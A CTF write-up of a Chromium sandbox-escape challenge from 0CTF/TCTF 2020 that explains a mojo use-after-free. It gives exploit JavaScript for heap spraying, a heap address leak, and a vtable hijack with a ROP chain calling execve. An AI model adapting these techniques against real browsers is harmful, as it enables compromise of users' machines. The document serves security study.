---
layout: post
title:  "0CTF/TCTF 2020 Quals Chromium SBX"
date:   2020-07-03 00:00:00 +0000
categories: jekyll update
---

## 0x00 Overview

Last weekend [we](https://r3kapig.com/) played 0CTF/TCTF Quals and got 4th place, which is awesome. As a browser security researcher, I solved Chromium RCE and SBX, and it is my first time to exploit the Chromium SBX, so I think it is worthy to do a writeup.

In this challenge, a UAF is caused by improper use of `unique_ptr::get`, and by manipulating `base::queue` we can allocate a buffer with same size as the UAF object, which allows us to completely control the UAF object. Then the heap address can be leaked by inserting elements into `base::deque` field of a UAF object, whose contents can be controlled and obtained. Then we can control the RIP by rewriting the `vtable` and call the virtual function. By pivoting the stack ROP can be done.

## 0x01 Bug

I won't go through the logic of new `mojo` service since it is not hard to understand. It is just a simple storage service. `TStorage` is the factory interface used to create the instance, and `TInstance` is the actual interface that provides storage operations.

The bug is the improper use of `unique::ptr`:

```c++
void TStorageImpl::Init(InitCallback callback) {
    inner_db_ = std::make_unique<InnerDbImpl>();
    // Init will release the previous inner_db pointer
    std::move(callback).Run();
}

void TStorageImpl::CreateInstance(CreateInstanceCallback callback) {
    mojo::PendingRemote<blink::mojom::TInstance> instance;
    mojo::MakeSelfOwnedReceiver(std::make_unique<content::TInstanceImpl>(inner_db_.get()),
                                instance.InitWithNewPipeAndPassReceiver());
    // so inner_db_.get() pointer obtained previously will be freed
    // which is UAF
    std::move(callback).Run(std::move(instance));
}
```

In the code above, `TStorageImpl::CreateInstance` will pass the pointer stored inside `unique_ptr` `inner_db_` into the constructor of `TInstanceImpl` using `get`, and the new `TInstanceImpl` instance will store the pointer into its field. However, `TStorageImpl::Init` can be called multiple times; if it is called when `inner_db_` already contains an instance, the previous instance will be deleted. If that previous instance was passed to `TInstanceImpl` and thus stored by the `TInstanceImpl` instance, a UAF of an `InnerDbImpl` instance would be caused.

## 0x02 Exploitation

### Control the Contents of the UAF Object

As we can see, there is a virtual function for `InnerDbImpl` class. Therefore the idea is clear: we need to allocate a memory chunk with same size as the `InnerDbImpl` to fully control its contents, including the virtual table and thus the `rip` can be hijacked. However, this got me stuck for quite long time. Since we cannot directly allocate a memory chunk with arbitrary size directly, we must manipulate to allocate a memory chunk whose size is same as `InnerDbImpl`. By reading the code and debugging, we found that the `sizeof` of `InnerDbImpl` is `0x678`.

The only possible field that can allow us to do so is `base::queue<uint64_t> queue_`. However, if we just pushing new elements into the `queue`, it seems that the sizes of buffers being allocated will simply "jump over" the our desired size. Nonetheless, we still have a `pop` operation, and this `pop` operation may allow us to be able to manipulate the size of buffer being allocated. Thus, we need to know how `base::queue` is implemented.

As `queue.h` shows, `base::queue` is simply `queue` but with `base::circular_deque` as `Container`:

```c++
// Provides a definition of base::queue that's like std::queue but uses a
// base::circular_deque instead of std::deque. Since std::queue is just a
// wrapper for an underlying type, we can just provide a typedef for it that
// defaults to the base circular_deque.
template <class T, class Container = circular_deque<T>>
using queue = std::queue<T, Container>;
```

Thus the critical thing is how `circular_deque` is [implemented](https://github.com/chromium/chromium/blob/154ef649b0423799ad03df155dc42c67cc7dc7b1/base/containers/circular_deque.h).

We can know from reading STL source code that `std::queue` calls `push_back` as `push` and calls `pop_front` as `pop`. Therefore, we need to focus on these 2 functions of `base::circular_deque`.

```c++
// --- push ---
void push_front(const T& value) { emplace_front(value); }
template <class... Args>
reference emplace_front(Args&&... args) {
  ExpandCapacityIfNecessary(1); 
  // the function used to expand buffer,
  // which we care about because this affect the size of buffer allocated

  // ... do the actual push, which we don't care
}

// --- pop ---
void pop_front() {
  // ... actual poping operation, which we don't care

  ShrinkCapacityIfNecessary(); 
  // the function used to shrink the capacity, which is buffer size,
  // so we care about this function

  // ...
}
```

Thus, the function that we need to care about is `ExpandCapacityIfNecessary` and `ShrinkCapacityIfNecessary`, let's look at their implementation.

```c++
// Expands the buffer size. This assumes the size is larger than the
// number of elements in the vector (it won't call delete on anything).
void SetCapacityTo(size_t new_capacity) {
  // Use the capacity + 1 as the internal buffer size to differentiate
  // empty and full (see definition of buffer_ below).
  VectorBuffer new_buffer(new_capacity + 1);
  // using VectorBuffer = internal::VectorBuffer<T>;
  // if we look at implementation of VectorBuffer, this will allocate
  // `(new_capacity + 1) * sizeof(T)` bytes of memory.
  // since our queue element type is uint64_t, sizeof(T) is 8.
  // thus to allocate 0x678 bytes, 
  // we need to let new_capacity=(0x678/8)-1=206
  MoveBuffer(buffer_, begin_, end_, &new_buffer, &begin_, &end_);
  buffer_ = std::move(new_buffer);
}
void ExpandCapacityIfNecessary(size_t additional_elts) {
  size_t min_new_capacity = size() + additional_elts;
  if (capacity() >= min_new_capacity)
    return;  // Already enough room.

  min_new_capacity =
      std::max(min_new_capacity, internal::kCircularBufferInitialCapacity);
  // in our case, min_new_capacity > internal::kCircularBufferInitialCapacity
  // when this line is reached,
  // because kCircularBufferInitialCapacity is the initial capacity, 3

  // std::vector always grows by at least 50%. WTF::Deque grows by at least
  // 25%. We expect queue workloads to generally stay at a similar size and
  // grow less than a vector might, so use 25%.
  size_t new_capacity =
      std::max(min_new_capacity, capacity() + capacity() / 4);
  // grow 25% each time, but we need to at least grow to min_new_capacity
  SetCapacityTo(new_capacity);
}

void ShrinkCapacityIfNecessary() {
  // Don't auto-shrink below this size.
  if (capacity() <= internal::kCircularBufferInitialCapacity)
    return;

  // Shrink when 100% of the size() is wasted.
  // namely only shrink when size <= empty_space
  size_t sz = size();
  size_t empty_spaces = capacity() - sz;
  if (empty_spaces < sz)
    return;

  // Leave 1/4 the size as free capacity, not going below the initial
  // capacity.
  size_t new_capacity =
      std::max(internal::kCircularBufferInitialCapacity, sz + sz / 4);
  // since `sz` is around `capacity/2`, 
  // so capacity is shrinked to around `5/8` of the original capacity  
  if (new_capacity < capacity()) {
    // Count extra item to convert to internal capacity.
    SetCapacityTo(new_capacity);
  }
}
```

Since the expanding is `5/4` of the original capacity and shrinking is `5/8` of the original capacity, it seems that it is possible to let capacity to any value! great! But how to figure out the way to let `capacity=206`? You may try some advanced technique like BFS, but I don't think it is as complicated as that. What I did is simply expand and shrink randomly and see if desired `new_capacity` value is obtained. Here is the code:

```python
from random import *
x = 10 
# we start at 10, because 10 is the capacity value 
# that +1/4 operation starts to play the expanding role 
ways = []
while x < 207:
	b = random() > 0.1 # we want more expand
	ways.append(b)
	if b: # mimic expand operation
		x = int(max(x + 1, x + x / 4))
	else: # mimic shrink operation
		x = x / 2
		x += x / 4
	print (x)
	if x == 206:
		print "!!!" # notify when 206 is reached
print ways
```

Finally, my series of operation to obtain the 206 capacity is:

```
operations: 10 -> True, True, True, True, True, True, True, True, True, True, True, False, True, True, False, True, True, False, True, True, True, True, True, True,
sizes: 12 15 18 22 27 33 41 51 63 78 97 60 75 93 57 71 88 55 68 85 106 132 165 206
```

After trial, this indeed allocates the desired `0x678` size memory chunk. Here is the JS code:

```javascript
async function sprayQueue(tInsPtrSprays, val=0x41414141)
{
	let i = 0;
	for (const tInsPtr of tInsPtrSprays)
	{
		for (let i = 0; i < 97; i++)
			await tInsPtr.push(val);
		for (let i = 0; i < 49; i++)
			await tInsPtr.pop();
		// current capacity: 60, current size: 48
		for (let i = 0; i < 93 - 48; i++)
			await tInsPtr.push(val);
		for (let i = 0; i < 47; i++)
			await tInsPtr.pop();
		// current capacity: 57, current size: 46
		for (let i = 0; i < 88 - 46; i++)
			await tInsPtr.push(val);
		for (let i = 0; i < 44; i++)
			await tInsPtr.pop();
		// current capacity: 55, current size: 44
		for (let i = 0; i < 206 - 44 - 1; i++)
			await tInsPtr.push(0);
		await tInsPtr.push(i);
		// int_value_, we can use this to identify 
        // which tInsPtr's queue is occupying the UAF object
		i++;

		// console.log(await tInsPtr.getTotalSize());
	}
}
```

While `tInsPtrSprays` must be created beforehand(e.i. before UAF is triggered), otherwise the `InnerDbImpl` created in `init` will occupy the UAF object instead.

```javascript
async function createSprayObjects(tInsPtrSprays)
{
	const tStrPtrSpray = new blink.mojom.TStoragePtr();
	Mojo.bindInterface(blink.mojom.TStorage.name,
		mojo.makeRequest(tStrPtrSpray).handle, 'context', true);
	await tStrPtrSpray.init();
	const tInsPtr = (await tStrPtrSpray.createInstance()).instance;
	tInsPtrSprays.push(tInsPtr);
	refs.push(tStrPtrSpray);
}
```

### Leak Heap Address

After we are able to control the contents of the UAF object, we must leak the heap address to construct and use a fake `vtable` on heap. My idea is to fill the UAF object such that `base::queue` field is filled with all zeros, which means an empty queue. After then, we can push something into the queue to let it become a heap address pointing to contents that we can control (e.i. contents pushed into queue). Then, we can pop `base::queue` field of the `tInsPtr` whose `base::queue` field is occupying the UAF object, thus to leak that heap address stored in `base::queue` field of UAF object. 

The code is shown as follows:

```javascript
// tInsPtr here is the UAF object
const idx = (await tInsPtr.getInt()).value;
print(idx); // get which one is occupying the UAF object
for (let i = 0; i < 201; i++)
	await tInsPtrSprays[idx].pop();
const heapAddr = (await tInsPtrSprays[idx].pop()).value;
// pop element to leak the address of heap
// now 0x678 is freed again due to poping elements
print(hex(heapAddr));
```

### Code Execution

Finally we are here! According to [exploit](https://gist.github.com/ujin5/5b9a2ce2ffaf8f4222fe7381f792cb38) of mojo in Plaid CTF, we found that `xchg rsp,rax` is a gadget existed in Chrome binary, thus we found this manually using gdb search as running `ropper` on Chrome is too slow. Since when calling the virtual table function, `rax` points to `vtable`, which is the buffer we can control, we can put our ROP chain at `rax` along with the fake virtual function address! My approach is to use the buffer of `base::queue` whose address is the one we leaked as the fake virtual table. Thus ROP chain and address of `xchg rsp,rax` as fake virtual function are pushed into the `base::queue` when leaking the heap address as suggested above.

```javascript
// rop and fake virtual table
// 0xd1ba7: lea rdi, [rsp + 0xb0]; mov rsi, rbp; call rbx
// 0x52bc8: pop rbp; pop rbx; ret;
// 0x2cb49: pop rbx; ret;
// 0x1b96: pop rdx; ret;
// 0x439c8: pop rax; ret;

// tInsPtr is the UAF object whose base::queue field is empty intially
await tInsPtr.push(libcAddr + 0x52bc8); // begin of ROP
await tInsPtr.push(0); // let queue to have some element
await tInsPtr.push(textAddr + 0x3fa5114); // xchg rsp,rax, as virtual table
await tInsPtr.push(libcAddr + 0x2cb49);
await tInsPtr.push(libcAddr + 0xe4e30); // execve

await tInsPtr.push(libcAddr + 0x1b96);
await tInsPtr.push(0); // rdx = 0

await tInsPtr.push(libcAddr + 0xd1ba7);

for (let i = 0; i < 0x10; i++) {
	await tInsPtr.push([0x6c662f2e, 0x705f6761]);
/* 
// setUint64 in mojo_bindings.js is modified to this to support this,
// otherwise we cannot set a correct uint64
// due to the precision of js number
Buffer.prototype.setUint64 = function(offset, value) {
  var hi;
  if (typeof value == 'object') {
    hi = value[1];
    value = value[0]
  }
  else {
    hi = (value / kHighWordMultiplier) | 0;
  }
  if (kHostIsLittleEndian) {
    this.dataView.setInt32(offset, value, kHostIsLittleEndian);
    this.dataView.setInt32(offset + 4, hi, kHostIsLittleEndian);
  } else {
    this.dataView.setInt32(offset, hi, kHostIsLittleEndian);
    this.dataView.setInt32(offset + 4, value, kHostIsLittleEndian);
  }
}
*/
	await tInsPtr.push(0x7265746e6972)
}
```

Here is the full [exploit](https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/T20ChromeSBX.html).

